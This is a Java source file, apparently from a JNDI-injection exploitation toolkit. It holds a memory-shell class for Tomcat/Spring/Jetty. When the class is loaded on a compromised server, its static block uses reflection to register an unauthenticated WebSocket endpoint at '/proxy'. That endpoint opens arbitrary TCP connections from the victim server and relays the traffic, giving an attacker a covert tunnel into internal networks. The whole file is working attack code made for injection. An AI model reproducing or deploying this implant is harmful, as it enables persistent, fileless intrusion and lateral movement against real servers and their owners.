package com.qi4l.jndi.template.memshell.Tomcat_Spring_Jetty;

import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.catalina.webresources.StandardRoot;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Field;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.AsynchronousSocketChannel;
import java.nio.channels.CompletionHandler;
import java.util.HashMap;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import javax.websocket.*;
import javax.websocket.server.ServerContainer;
import javax.websocket.server.ServerEndpointConfig;

public class MsTSJproxy extends Endpoint implements MessageHandler.Whole<ByteBuffer>,CompletionHandler<Integer, Session>{

    private Session session;
    long i = 0;
    private AsynchronousSocketChannel client = null;
    final ByteBuffer buffer = ByteBuffer.allocate(102400);
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    HashMap<String,AsynchronousSocketChannel> map = new HashMap<String,AsynchronousSocketChannel>();

    public MsTSJproxy() {}

    static {
        String path = "/proxy";
        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        StandardRoot standardroot = (StandardRoot) webappClassLoaderBase.getResources();
        if (standardroot == null){
            Field field = null;
            try {
                field = webappClassLoaderBase.getClass().getDeclaredField("resources");
                field.setAccessible(true);
            }catch (Exception e){
                try {
                    field = webappClassLoaderBase.getClass().getSuperclass().getDeclaredField("resources");
                } catch (NoSuchFieldException ex) {
                    ex.printStackTrace();
                }
                field.setAccessible(true);
            }
            try {
                standardroot = (StandardRoot)field.get(webappClassLoaderBase);
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            }
        }
        StandardContext standardContext = (StandardContext) standardroot.getContext();
        ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder.create(MsTSJproxy.class, path).build();
        ServerContainer container = (ServerContainer) standardContext.getServletContext().getAttribute(ServerContainer.class.getName());
        try {
            container.addEndpoint(configEndpoint);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }



    @Override
    public void completed(Integer result, Session channel) {
        buffer.clear();
        try {
            if(buffer.hasRemaining() && result>=0)
            {
                byte[] arr = new byte[result];
                ByteBuffer b = buffer.get(arr,0,result);
                baos.write(arr,0,result);
                ByteBuffer q = ByteBuffer.wrap(baos.toByteArray());
                if (channel.isOpen()) {
                    channel.getBasicRemote().sendBinary(q);
                }
                baos = new ByteArrayOutputStream();
                readFromServer(channel,client);
            }else{
                if(result > 0)
                {
                    byte[] arr = new byte[result];
                    ByteBuffer b = buffer.get(arr,0,result);
                    baos.write(arr,0,result);
                    readFromServer(channel,client);
                }
            }
        } catch (Exception ignored) {
        }
    }

    @Override
    public void failed(Throwable t, Session channel) {
        t.printStackTrace();
    }

    @Override
    public void onMessage(ByteBuffer message) {
        try {
            message.clear();
            i++;
            process(message,session);
        } catch (Exception ignored) {
        }
    }

    @Override
    public void onOpen(Session session, EndpointConfig endpointConfig) {
        this.i = 0;
        this.session = session;
        session.setMaxBinaryMessageBufferSize(1024*1024*1024);
        session.setMaxTextMessageBufferSize(1024*1024*1024);
        session.addMessageHandler(this);
    }

    void readFromServer(Session channel,final AsynchronousSocketChannel client){
        this.client = client;
        buffer.clear();
        client.read(buffer, channel, this);
    }
    void process(ByteBuffer z,Session channel)
    {
        try{
            if(i>1)
            {
                AsynchronousSocketChannel client = map.get(channel.getId());
                client.write(z).get();
                readFromServer(channel,client);
            }
            else if(i==1)
            {
                String values = new String(z.array());
                String[] array = values.split(" ");
                String[] addrarray = array[1].split(":");
                AsynchronousSocketChannel client = AsynchronousSocketChannel.open();
                int po = Integer.parseInt(addrarray[1]);
                InetSocketAddress hostAddress = new InetSocketAddress(addrarray[0], po);
                Future<Void> future = client.connect(hostAddress);
                try {
                    future.get(10, TimeUnit.SECONDS);
                } catch(Exception ignored){
                    channel.getBasicRemote().sendText("HTTP/1.1 503 Service Unavailable\r\n\r\n");
                    return;
                }
                map.put(channel.getId(), client);
                readFromServer(channel,client);
                channel.getBasicRemote().sendText("HTTP/1.1 200 Connection Established\r\n\r\n");
            }
        }catch(Exception ignored){
        }
    }
}
